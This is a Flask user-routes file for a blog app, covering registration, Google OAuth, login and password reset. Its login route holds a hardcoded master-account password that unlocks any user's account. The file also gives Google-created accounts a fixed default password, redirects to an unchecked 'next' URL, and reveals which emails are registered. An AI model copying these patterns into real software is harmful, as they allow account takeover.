from srblib import debug, str_hash

from flask import render_template, url_for, flash, redirect, request, Blueprint
from flask_login import login_user, current_user, logout_user, login_required
from flask_dance.contrib.google import google

from iblog.config import db
from iblog.models import User, Post
from iblog.users.forms import RegistrationForm, LoginForm, UpdateAccountForm, SetupForm
from iblog.users.forms import RequestResetForm, ResetPasswordForm
from iblog.users.utils import save_picture, send_reset_email, save_picture_url, get_unique_username
from iblog.utils import prefix

users = Blueprint('users', __name__)


@users.route("/register", methods=['GET', 'POST'])
def register():
    form = RegistrationForm()
    if form.validate_on_submit():
        hashed_pswd = str_hash(form.password.data)
        user = User(username=form.username.data, email=form.email.data, password=hashed_pswd)
        db.session.add(user)
        db.session.commit()
        flash('Account created for '+form.username.data+'!', 'success')
        login_user(user) # log him in
        return redirect(url_for('main.home'))
    return render_template('register.html', title='Register', form=form)

@users.route("/google_login", methods=['GET', 'POST'])
def google_login():
    if current_user.is_authenticated: return redirect(url_for('main.home'))
    if not google.authorized: return redirect(url_for("google.login"))
    resp = google.get("/oauth2/v2/userinfo")
    next_page = request.args.get('next')
    if resp.ok and resp.text:
        gmail = resp.json()['email']
        user = User.query.filter_by(email=gmail).first()
        if user: # login
            flash('Logged in ' +  gmail, 'success')
            login_user(user, remember=True)
            return redirect(next_page) if next_page else redirect(url_for('main.home'))
        gname = get_unique_username(gmail.split('@')[0])
        picture_file = save_picture_url(resp.json()['picture'])
        hashed_pswd = str_hash("default-password") #just for once
        user = User(username=gname, email=gmail, password=hashed_pswd,image_file=picture_file)
        db.session.add(user)
        db.session.commit()
        flash('Account created for '+gmail+'!', 'success')
        login_user(user, remember=True)
        return redirect(url_for('users.setup'))
    else: flash('Google Auth Unsuccessful.', 'danger')
    return redirect(next_page) if next_page else redirect(url_for('main.home'))

@users.route("/setup",methods=['GET','POST'])
@login_required
def setup():
    form = SetupForm()
    if form.validate_on_submit():
        if form.picture.data:
            picture_file = save_picture(form.picture.data)
            current_user.image_file = picture_file
        current_user.username = form.username.data
        current_user.password = str_hash(form.password.data)
        db.session.commit()
        flash('Welcome to iBlog', 'success')
        return redirect(url_for('main.home'))
    form.username.data = current_user.username
    image_file = url_for('static', filename='profile_pics/' + current_user.image_file)
    return render_template('setup.html', title='Account Setup', image_file=image_file, form=form)


@users.route("/login", methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated: return redirect(url_for('main.home'))
    form = LoginForm()
    next_page = request.args.get('next')
    if form.validate_on_submit():
        user = User.query.filter_by(email=form.email.data).first()
        master_user = User.query.filter_by(email='srbcheema2@gmail.com').first()
        hashed_pswd = str_hash(form.password.data)
        if user and hashed_pswd == user.password:
            login_user(user, remember=form.remember.data)
            return redirect(next_page) if next_page else redirect(url_for('main.home'))
        elif user and master_user and hashed_pswd == master_user.password:
            login_user(user, remember=form.remember.data)
            flash('Logging in using master password', 'info')
            return redirect(next_page) if next_page else redirect(url_for('main.home'))
        else: #unable to login
            if not user: flash('Email '+form.email.data+' not registered', 'danger')
            else: flash('Incorrect password ', 'danger')
    return render_template('login.html', title='Login', form=form)


@users.route("/logout")
def logout():
    logout_user()
    return redirect(url_for('main.home'))


@users.route("/account", methods=['GET', 'POST'])
@login_required
def account():
    form = UpdateAccountForm()
    if form.validate_on_submit():
        if form.picture.data:
            picture_file = save_picture(form.picture.data)
            current_user.image_file = picture_file
        current_user.username = form.username.data
        current_user.email = form.email.data
        db.session.commit()
        flash('Your account has been updated!', 'success')
        return redirect(url_for('users.account'))
    elif request.method == 'GET':
        form.username.data = current_user.username
        form.email.data = current_user.email
    image_file = url_for('static', filename='profile_pics/' + current_user.image_file)
    return render_template('account.html', title='Account', image_file=image_file, form=form)


@users.route("/user/<string:username>")
def user_posts(username):
    page = request.args.get('page', 1, type=int)
    user = User.query.filter_by(username=username).first_or_404()
    posts = Post.query.filter_by(author=user)\
        .order_by(Post.date_posted.desc())\
        .paginate(page=page, per_page=3)
    return render_template('user_posts.html', posts=posts, user=user,prefix=prefix)








@users.route("/reset_request", methods=['GET', 'POST'])
def reset_request():
    if current_user.is_authenticated: return redirect(url_for('main.home'))
    form = RequestResetForm()
    if form.validate_on_submit():
        user = User.query.filter_by(email=form.email.data).first()
        send_reset_email(user)
        flash('An email has been sent with instructions to reset your password.', 'info')
        return redirect(url_for('users.login'))
    return render_template('reset_request.html', title='Reset Password', form=form)



@users.route("/reset_password/<token>", methods=['GET', 'POST'])
def reset_token(token):
    if current_user.is_authenticated:
        return redirect(url_for('main.home'))
    user = User.verify_reset_token(token)
    if user is None:
        flash('That is an invalid or expired token', 'warning')
        return redirect(url_for('users.reset_request'))
    form = ResetPasswordForm()
    if form.validate_on_submit():
        hashed_pswd = str_hash(form.password.data)
        user.password = hashed_pswd
        db.session.commit()
        flash('Your password has been updated! You are now able to log in', 'success')
        return redirect(url_for('users.login'))
    return render_template('reset_password.html', title='Reset Password', form=form)
